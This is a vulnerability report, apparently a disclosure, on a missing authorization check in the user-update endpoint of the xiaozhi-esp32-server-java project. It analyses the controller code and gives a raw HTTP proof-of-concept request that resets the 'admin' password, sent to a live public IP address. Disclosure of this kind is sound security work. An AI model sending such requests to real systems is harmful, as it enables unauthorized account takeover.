# Vulnerability Description

The system/update user information modification interface contains a high-risk vulnerability of unauthorized modification: the interface only queries the target user by username, does not verify the login status and modification permissions of the request initiator, and has no secondary verification mechanism. Attackers can construct requests specifying arbitrary usernames to directly modify sensitive information such as the target user's password, mobile phone number, and email address, and even take over the administrator account. At the same time, the interface parameter validation is missing. When the username is empty, a null pointer exception will be triggered, which poses a denial-of-service risk.

# Vulnerability Analysis

The vulnerability lies in the `update` method within the class file `src/main/java/com/xiaozhi/controller/UserController.java`.

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.9gx0flit9y.webp)

We focus directly on whether the fields in the WHERE clause are controllable during updates, and the update method is userService.update.

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.1sfhdoj0pf.webp)

As you can see, if username, email, or tel are not empty, the information is updated based on the corresponding value. Here, username is obtained through the loginRequest method in the route annotation, which is a Map collection, meaning it's controllable. The focus is on whether the old password is required for password changes.

![](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.9gx0fliz4f.webp)

As you can see, the old password isn't needed; only the new password is passed in. Therefore, this allows you to reset the password of any user, and combined with unauthorized information leaks to obtain usernames, this can lead to the acquisition of all accounts on the entire site.

# Vulnerability Reproduction

Test address: http://120.26.30.62/api/user/update

Proof of Concept (PoC):  


```python
POST /api/user/update HTTP/1.1
Host: 120.26.30.62
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 61

{"username":"admin","password":"123456","password2":"123456"}
```

![img](https://github.com/labi1106/picx-images-hosting/raw/master/xiaozhi-esp32-server-java/image.7pqe7lyjc.webp)
